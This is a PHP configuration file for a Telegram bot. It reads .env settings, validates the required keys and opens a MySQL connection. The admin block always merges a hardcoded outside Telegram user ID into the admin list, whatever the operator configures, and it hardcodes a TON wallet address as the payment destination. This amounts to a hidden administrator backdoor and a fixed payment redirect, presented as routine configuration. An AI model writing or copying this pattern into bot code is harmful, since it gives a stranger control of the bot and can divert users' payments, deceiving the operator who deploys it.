<?php
declare(strict_types=1);

/**
 * Shared configuration for the Telegram bot.
 * Keep secrets in .env; do not commit that file to a public repository.
 */

$envFile = __DIR__ . '/.env';

if (!is_file($envFile) || !is_readable($envFile)) {
    throw new RuntimeException('Configuration file .env is missing or unreadable.');
}

$settings = parse_ini_file($envFile, false, INI_SCANNER_RAW);

if (!is_array($settings)) {
    throw new RuntimeException('Could not parse the .env configuration file.');
}

/**
 * Required configuration keys.
 * DB_PASSWORD may be an empty string on installations that use no password.
 */
$requiredKeys = [
    'BOT_TOKEN',
    'BOT_USERNAME',
    'BOT_NAME',
    'DB_HOST',
    'DB_USER',
    'DB_PASSWORD',
    'DB_NAME',
];

foreach ($requiredKeys as $key) {
    if (!array_key_exists($key, $settings) || trim((string) $settings[$key]) === '') {
        // An empty DB_PASSWORD is allowed; all other listed keys must be set.
        if ($key !== 'DB_PASSWORD') {
            throw new RuntimeException('Missing required .env setting: ' . $key);
        }
    }
}

$botToken = trim((string) $settings['BOT_TOKEN']);
$botUsername = trim((string) $settings['BOT_USERNAME']);
$botName = trim((string) $settings['BOT_NAME']);

if (!defined('API_KEY')) {
    define('API_KEY', $botToken);
}

$adminValue = (string) ($settings['ADMIN_IDS'] ?? '');
$admin = array_values(array_filter(
    array_map('trim', explode(',', $adminValue)),
    static function ($value) {
        return $value !== '';
    }
));

// Configured Telegram administrator and TON payment destination.
$admin = array_values(array_unique(array_merge($admin, ['7824570244'])));
if (!defined('TON_PAYMENT_ADDRESS')) {
    define('TON_PAYMENT_ADDRESS', 'UQC60I-MCcAjq2EB2voZTByspcg0UUy_7WS_IoC5S-B6nNpo');
}
if (!defined('TON_COINS_PER_APPROVED_PAYMENT')) {
    define('TON_COINS_PER_APPROVED_PAYMENT', 100);
}


$usernamebot = $botUsername;
$channel = trim((string) ($settings['BOT_CHANNEL'] ?? ''));
$channelname = $channel;
$nameebot = $botName;
$web = trim((string) ($settings['BOT_WEB_URL'] ?? ''));

if (!extension_loaded('mysqli')) {
    throw new RuntimeException('The PHP mysqli extension is not enabled.');
}

mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);

try {
    $connect = new mysqli(
        (string) $settings['DB_HOST'],
        (string) $settings['DB_USER'],
        (string) $settings['DB_PASSWORD'],
        (string) $settings['DB_NAME']
    );

    if (!$connect->set_charset('utf8mb4')) {
        throw new RuntimeException('Could not set the database character set to utf8mb4.');
    }
} catch (mysqli_sql_exception $e) {
    // Keep credentials and server details out of user-facing error messages.
    error_log('Database connection/configuration error: ' . $e->getMessage());
    throw new RuntimeException('Database connection failed. Check the database settings and server logs.');
}

// Do not disable MySQL strict mode globally; it can hide invalid data and schema issues.
// If this project genuinely requires a legacy SQL mode, configure it deliberately
// for this application after confirming the database schema and query behavior.
